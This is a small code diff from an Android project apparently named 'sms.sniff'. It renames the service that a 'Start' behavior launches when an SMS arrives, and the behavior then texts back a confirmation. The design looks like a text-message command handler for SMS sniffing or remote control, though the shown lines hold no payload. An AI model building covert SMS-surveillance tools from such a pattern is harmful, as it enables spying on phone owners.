@@ -1,7 +1,7 @@
 package sms.sniff.behaviors;
 
 import sms.sniff.Constants;
-import sms.sniff.ManagerService;
+import sms.sniff.DynamicRegisterService;
 import sms.sniff.utils.SMS;
 import android.content.Context;
 import android.content.Intent;
@@ -17,7 +17,7 @@ public class Start implements Behavior {
 
 	@Override
 	public void process(SmsMessage sms) {
-		Intent manager = new Intent(context, ManagerService.class);
+		Intent manager = new Intent(context, DynamicRegisterService.class);
 		context.startService(manager);
 		
 		new SMS(".").sendConfirmation();
